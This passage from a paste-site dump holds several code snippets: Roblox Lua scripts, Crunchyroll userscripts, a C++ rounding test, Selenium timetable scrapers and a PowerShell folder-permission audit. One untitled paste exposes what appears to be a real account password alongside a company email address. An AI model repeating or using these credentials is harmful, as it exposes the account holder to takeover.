local attachment = Instance.new(""Attachment"", part)

linearVelocity.Attachment0 = attachment

task.spawn(function()
	while task.wait(0.1) do
		local red = math.random(0, 255)
		local green = math.random(0, 255)
		local blue = math.random(0, 255)
		part.Color = Color3.new(red, green, blue)
	end
end)

"
313QGVfE,ServerScriptsService - Project 1,BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 10:46:24 AM CDT,"local CollectionService = game:GetService(""CollectionService"")

local taggedParts = CollectionService:GetTagged(""KillParts"")

for _,part:Part in pairs(taggedParts) do
	part.Material = Enum.Material.Neon
	part.BrickColor = BrickColor.new(""Really red"")
	
	part.Touched:Connect(function(hitObject)
		local character = hitObject.Parent
		local humanoid = character:FindFirstChildOfClass(""Humanoid"")::Humanoid
		if humanoid then
			humanoid.Health = 0
		end
	end)
end"
D4R4x5Y1,Force Enable Picture-in-Picture,Froschi,JavaScript,Thursday 12th of June 2025 10:44:18 AM CDT,"// ==UserScript==
// @name         Force Enable Picture-in-Picture
// @description  Replaces disablepictureinpicture with enablepictureinpicture, even inside iframes - Enforces video players to enable PiP mode / Example: Crunchyroll
// @version      1.0
// @author       Froschi
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    // Replace existing attributes
    function replaceAttributes(root = document) {
        const elements = root.querySelectorAll('[disablepictureinpicture]');
        elements.forEach(el => {
            console.log(""🔧 Enforcing Picture-in-Picture on:"", el);
            el.removeAttribute('disablepictureinpicture');
            el.setAttribute('enablepictureinpicture', '');
        });
    }

    // Watch for new elements being added dynamically
    function watchForNewElements(root = document) {
        const observer = new MutationObserver(mutations => {
            mutations.forEach(mutation => {
                mutation.addedNodes.forEach(node => {
                    if (node.nodeType === 1) {
                        if (node.hasAttribute('disablepictureinpicture')) {
                            node.removeAttribute('disablepictureinpicture');
                            node.setAttribute('enablepictureinpicture', '');
                        }
                        const inner = node.querySelectorAll('[disablepictureinpicture]');
                        inner.forEach(el => {
                            el.removeAttribute('disablepictureinpicture');
                            el.setAttribute('enablepictureinpicture', '');
                        });
                    }
                });
            });
        });
        observer.observe(root.body, { childList: true, subtree: true });
    }

    // Run on page load
    window.addEventListener('load', () => {
        console.log(""🌼 Page loaded, enabling picture-in-picture..."");
        replaceAttributes();
        watchForNewElements();
    });
    replaceAttributes();
})();"
Qw0WNCER,Untitled,BrunoMAzeredo,Python,Thursday 12th of June 2025 10:43:16 AM CDT,"Conta BMA	

CCST : Pass: G@D1234
ccst@bma.com.br"
cp7bgcX7,Auto-Play and Auto-Skip Crunchyroll,Froschi,JavaScript,Thursday 12th of June 2025 10:39:49 AM CDT,"// ==UserScript==
// @name         Auto-Crunchy
// @description  Automatically clicks play/skip when it appears
// @version      1.0
// @author       Froschi
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';
	
	// Change texts to your language
    const TARGET_TEXTS = [
        ""SKIP OPENING"",
        ""OPENING ÜBERSPRINGEN"",
        ""SKIP INTRO"",
        ""ÜBERSPRINGEN"",
        ""CREDITS ÜBERSPRINGEN""
    ];

    let isCooldown = false;

    function getOwnText(el) {
        return Array.from(el.childNodes)
            .filter(node => node.nodeType === Node.TEXT_NODE)
            .map(node => node.textContent.trim())
            .join("" "");
    }

    function tryClickSkipText() {
        const allElements = document.querySelectorAll(""*"");
        for (const el of allElements) {
            const ownText = getOwnText(el);
            if (!TARGET_TEXTS.includes(ownText)) continue;
            const parent = el.parentElement;
            if (!parent) continue;
            console.log(`💫 Found ""${ownText}"" button, clicking!`);
            parent.click();
            return true;
        }
        return false;
    }

    function tryClickPlayButton() {
        const playButton = document.querySelector('[data-testid=""vilos-large_play_pause_button""][data-test-state=""paused""]');
        if (!playButton) return false;
        console.log(""▶️ Found paused play button, clicking!"");
        playButton.click();
        return true;
    }

    const observer = new MutationObserver(() => {
        if (isCooldown) return;
        if (!tryClickSkipText() && !tryClickPlayButton()) return;
        isCooldown = true;
        console.log(""🕒 Cooldown started (10s)~"");
        setTimeout(() => {
            isCooldown = false;
            console.log(""✅ Cooldown over, watching again~"");
        }, 10000);
    });

    observer.observe(document.body, {
        childList: true,
        subtree: true
    });

    console.log(""Watching for skip and play buttons."");
})();"
63UdQUDT,Untitled,allbano,C++,Thursday 12th of June 2025 09:55:57 AM CDT,"#include <iostream>

using namespace std;

float to_steps(float angle) {
  return (3200 * 38 / 360.0) * angle;
}

int main() {
  int counter = 0;
  float fcounter = 0.0;
  float c2 = 0.0;

  for (int k = 0; k < 10; ++k) {
    for (int i = 0; i < 360; ++i) {
      counter += to_steps(i);
      fcounter += to_steps(i);
      c2 += i;
    }

    std::cout << ""counter = "" << counter << '\n';
    std::cout << ""fcounter = "" << fcounter << '\n';
    std::cout << ""c2 = "" << c2 << ""\n\n"";

    for (int i = 359; i >= 0; --i) {
      counter -= to_steps(i);
      fcounter -= to_steps(i);
      c2 -= i;
    }
  }

  std::cout << ""counter = "" << counter << '\n';
  std::cout << ""fcounter = "" << fcounter << '\n';
  std::cout << ""c2 = "" << c2 << '\n';
  return 0;
}"
pdMixZiy,Untitled,RenSafaray,Python,Thursday 12th of June 2025 09:38:12 AM CDT,"from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import re  # Для работы с регулярными выражениями
import time

# Настройка Selenium
chrome_options = Options()
chrome_options.add_argument(""--headless"")  # Фоновый режим
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

# Открываем страницу
url = ""https://asu.bspu.ru/webapp/#/Rasp/""
driver.get(url)
time.sleep(5)  # Ждем загрузки

# Находим все ссылки <a>
links = driver.find_elements(By.TAG_NAME, ""a"")

# Парсим ID и название группы
for link in links:
    href = link.get_attribute(""href"")
    text = link.text.strip()  # Удаляем лишние пробелы
    
    if href and ""#/Rasp/Group/"" in href:  # Фильтруем только нужные ссылки
        # Извлекаем ID из ссылки (последнее число)
        group_id = re.search(r""Group/(\d+)"", href).group(1)
        
        print(f""ID группы: {group_id}, Название: {text}"")

driver.quit()"
BMNBLqRf,Untitled,RenSafaray,Python,Thursday 12th of June 2025 09:36:06 AM CDT,"from selenium import webdriver
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

# Настройка Selenium (Chrome)
chrome_options = Options()
chrome_options.add_argument(""--headless"")  # Режим без графического интерфейса
service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service, options=chrome_options)

# Открываем страницу
url = ""https://asu.bspu.ru/webapp/#/Rasp/""
driver.get(url)

# Ждем загрузки динамического контента
time.sleep(5)  # Можно заменить на ожидание появления элемента

# Находим все ссылки <a>
links = driver.find_elements(By.TAG_NAME, ""a"")

# Выводим href и текст ссылки
for link in links:
    href = link.get_attribute(""href"")
    text = link.text  # Текст внутри <a>...</a>
    if href and text:  # Проверяем, что оба значения не пустые
        print(f""Ссылка: {href}, Текст: {text}"")

# Закрываем браузер
driver.quit()"
MgP1JhjV,ps-refactor-get groups,joedigital,PowerShell,Thursday 12th of June 2025 09:17:13 AM CDT,"#assign params from command line
param(
  [Alias(""UNCPath"")]
  [Parameter(Mandatory)]
    [string]$SourcePath,
  [Alias(""OFilePath"")]
  [Parameter(Mandatory)]
    [string]$OutputFilePath
)

begin {
  
  $startTime = Get-Date

  #create arrayLists to hold output from 3 tasks: 1) count, 2) get ACLs, 3) expand group membership
  #$arrayListFolderCountResults = [System.Collections.ArrayList]@()
  $arrayListACLs = [System.Collections.ArrayList]@()
  #$arrayListGroupsToExpand = [System.Collections.ArrayList]@()

  #.net List (for performance and mutability) of identity/group names to exclude (case-insensitive matching will be used)
  #These are the ""name parts"" after any domain or ""BUILTIN\"" prefix.
  $listExcludedGroups = [System.Collections.Generic.List[string]]@()
    $listExcludedGroups.Add(""Administrators"")      # Matches BUILTIN\Administrators
    $listExcludedGroups.Add(""Authenticated Users"") # Matches well-known group
    $listExcludedGroups.Add(""Backup_OPs"")
    $listExcludedGroups.Add(""Domain Admins"")       # Matches well-known group
    $listExcludedGroups.Add(""Domain Users"")        # Matches well-known group
    $listExcludedGroups.Add(""NETWORK SERVICE"")     # Matches well-known group
    $listExcludedGroups.Add(""SYSTEM"")              # Matches NT AUTHORITY\SYSTEM
    $listExcludedGroups.Add(""CREATOR OWNER"")       # Matches special identity
    $listExcludedGroups.Add(""Users"")               # Matches BUILTIN\Users
  
  #get [only] folders (-Directory) under the source path for file counts and sizes
#**  ACLs uses -Recurse: need to account for this
#**   trying to avoid the perf hit of scanning the folders twice
  #long paths
  $longpath = '\\?\UNC'
  $SourcePath = $longpath + $SourcePath
  #$SourcePath
  $FoldersArray = @(Get-ChildItem $SourcePath -Directory -Recurse) #**debug recurse is later
  
  #init empty result set if there are no folders
  $Results = @()
  if ($FoldersArray.Count -eq 0) {
    $Results += [pscustomobject] @{
      Path = $SourcePath
      Count = 0
      GBSize = 0.00
      FolderDepth = 0
    }
  }

  #init the folder depth counter used in the foreach loop
  #$FoldersDeep = ($SourcePath -split '\\').Count - 2 #subtract for current (.) and parent (..)
  
  #new [pcustomobject] array for ACL results which will be the input to expand group members
  $ACLOutInfo = @()

  #new [pcustomobject] array for group member results
  #$uniqueGroups = @()

  #Write-Verbose ""Script initialized. Excluded identities (case-insensitive): $($Global:ExcludedIdentities -join ', ')"" -Verbose

}

process {

  #loop through the folders for ACLs + file counts; write separate CSVs for each
  ForEach ($currentFolder in $FoldersArray) {
    #display the current path being evaluated (top level only for file counts)
    write-host ""FoldersArray loop: $($currentFolder.FullName)"" -ForegroundColor Yellow -backgroundColor DarkGray
 
    #extract the ACLs for each folder in this loop

    #create a FolderInfo object (.net for speed)
    $objCurrentFolderInfo = New-Object System.IO.DirectoryInfo($currentFolder.FullName) #must use ""FullName"" for the complete UNC path
    $ACLs = $objCurrentFolderInfo.GetAccessControl()
    <#alternatives
      # $ACLs = [System.IO.Directory]::GetAccessControl($currentFolder.FullName)
      # $ACLs = Get-Acl -Path $currentFolder.FullName -ErrorAction Stop
      # $ACLs.Access | Format-Table
    
    #$ACLs.Access | Format-Table
    #>
    #exclude ACLs in the ExcludedGroups array (see ""begin {}"" section above)
    ForEach ($accessRule in $ACLs.Access) {
      <#
      GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) 
      GetAccessRules()
      The first boolean indicates that you want to include rules explicitly set on the object.
      The second boolean indicates that you want to exclude inherited rules but it doesn't seem to work. [Bug?]
      [System.Security.Principal.NTAccount] specifies that you want the IdentityReference
       (like a username or group name) to be translated into an NTAccount object, making it easily readable.
      #>
      #$ACLs.Access | Format-Table
      
      #only ACLs that are not inherited
      if ($accessRule.IsInherited -eq $false) {

        $thisGroupName = $accessRule.IdentityReference.Value
    #Write-host ""thisGroupName = $thisGroupName"" -ForegroundColor Green -backgroundColor DarkGray
        # Extract the GroupName, e.g., ""Administrators"" from ""BUILTIN\Administrators"" or ""SalesUsers"" from ""CONTOSO\SalesUsers""
        $thisShortGroupName = $thisGroupName.Split('\')[-1]
        #$thisShortGroupName

        # Check if the ShortGroupName is in the exclusion list (PowerShell -eq is case-insensitive for strings)
        $IsExcluded = $false
        ForEach ($ExcludedItem in $listExcludedGroups) {
          #test for exclusion
          if ($thisShortGroupName -eq $ExcludedItem) {
            $IsExcluded = $true
    #Write-host ""Excluding '$thisGroupName' because '$ExcludedItem' is in the exclusion list."" -ForegroundColor Yellow -backgroundColor DarkBlue
            break
          }
        } #end excluded groups loop

        if (-not $IsExcluded) {          
          #save this group for group member expansion
          $ACLOutInfo += [pscustomobject]@{
            FolderPath = $currentFolder.FullName
            IdentityReference = $thisGroupName
            #AccessControlType = $ACL.AccessControlType
            #IsInherited = $ACL.IsInherited
            #InheritanceFlags = $ACL.InheritanceFlags
            #PropagationFlags = $ACL.PropagationFlags
            FileSystemRights = $accessRule.FileSystemRights
          }
          <#
          $arrayListGroupsToExpand.Add($thisShortGroupName) #ArrayList because it won't be exported to CSV
          **Use the IdentityReference from the $ACLOutInfo array for the groups to be expanded?
          #>

          #add non-inherited, non-excluded ACL to array list
          $arrayListACLs.Add($ACLOutInfo)
          # write-host$arrayListACLs
    #      Write-Host ""  File System Rights: $($accessRule.FileSystemRights)""
    #      Write-Host ""  Is Inherited: $($accessRule.IsInherited)""
    #      Write-Host ""  Identity Reference: $thisGroupName""
          #Write-Host ""  File System Rights: $($accessRule.FileSystemRights)""
    #      Write-Host ""  Inheritance Flags: $($accessRule.InheritanceFlags)""
          #Write-Host ""  Access Control Type: $($accessRule.AccessControlType)""   
          #Write-Host ""  Propagation Flags: $($accessRule.PropagationFlags)""
    #      Write-Host ""-----------------------------------""
          #**
        } #endif IsExcluded
      
      } else {
   #Write-Host ""     skipping this rule (inherited) for $thisGroupName"" -ForegroundColor Yellow -BackgroundColor DarkRed
        }
      #endif IsInherited
   #Write-host ""looping for next access rule in $($currentFolder.FullName)"" -ForegroundColor Green -backgroundColor DarkGray
    } #end access rules loop
  } #end currentFolder loop
} #end process

end {

  #create output filename (ACLs)
  $OutFile = $OutputFilePath + ""acls-"" + $((Get-Date).ToString('yyyy-MM-dd_HH-mm-ss')) + "".csv""
  #Save results to csv file
  $ACLOutInfo | Export-Csv $OutFile -NoTypeInformation
  Write-host ""saving $OutFile..."" -ForegroundColor Green -backgroundColor DarkBlue
#  $ACLOutInfo | Export-Csv -Path ""G:\My Drive\tmp\myarrayList.csv"" -NoTypeInformation
#>
  $endTime = Get-Date
  New-TimeSpan -Start $startTime -End $endTime | Select-Object -Property TotalSeconds, TotalMinutes
  
  Write-Host ""end of script"" -ForegroundColor Green -backgroundColor DarkGray

}"
